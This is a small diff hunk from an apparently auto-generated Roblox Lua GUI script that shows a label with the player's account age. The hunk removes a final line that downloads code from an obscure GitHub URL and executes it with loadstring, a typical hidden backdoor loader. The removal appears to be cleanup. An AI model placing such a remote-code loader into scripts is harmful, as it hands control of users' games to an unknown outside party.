@@ -3754,4 +3754,3 @@ local function AIHWDFI_fake_script() -- TextLabel_38.LocalScript
 	TextLabel.Text = game.Players.LocalPlayer.AccountAge.."(D)"
 end
 coroutine.wrap(AIHWDFI_fake_script)()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Execution.lua"))()
